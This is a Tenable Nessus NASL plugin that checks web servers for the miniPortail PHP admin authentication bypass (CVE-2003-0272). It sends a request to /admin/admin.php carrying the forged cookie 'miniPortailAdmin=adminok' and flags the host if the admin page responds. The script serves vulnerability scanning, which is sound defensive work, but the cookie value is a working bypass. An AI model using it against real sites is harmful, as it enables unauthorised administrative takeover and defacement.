#
# (C) Tenable Network Security
#
#
# Ref:
#  Subject: miniPortail (PHP) : Admin Access
#  From: Frog Man (leseulfroghotmail.com)
#  Date: Thu May 08 2003 - 10:35:46 CDT 

if (description)
{
 script_id(11623);
 script_cve_id("CVE-2003-0272");
 script_version ("$Revision: 1.8 $");

 script_name(english:"miniPortail Cookie Admin Access");
 desc["english"] = "
The remote host is running MiniPortal - a set of PHP
CGIs designed to manage a web portal.

This software is vulnerable to a flaw in the way it checks
if the admin user authenticated already. An attacker may
use this flaw to gain administrative privileges on this
host without having to know the administrator password.

An attacker may exploit this flaw to edit the content of
the remote website.

Solution: None at this time;
Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if miniPortail can abused");
 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

function mkreq(path, cookie)
{
 if(isnull(path))path = "";
 req = http_get(item:path + "/admin/admin.php", port:port);
 if(cookie)
 {
  idx = stridx(req, string("\r\n\r\n"));
  req = insstr(req, string("\r\nCookie: miniPortailAdmin=adminok\r\n\r\n"), idx);
 }
 return req;
}

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);


foreach d (cgi_dirs())
{
 req = mkreq(path:d, cookie:1);
 res = http_keepalive_send_recv(port:port, data:req);
 if( res == NULL ) exit(0);
 if(egrep(pattern:".*admin\.php\?.*pg=dbcheck", string:res))
 	{
	security_hole(port);
	exit(0);
	}
 }
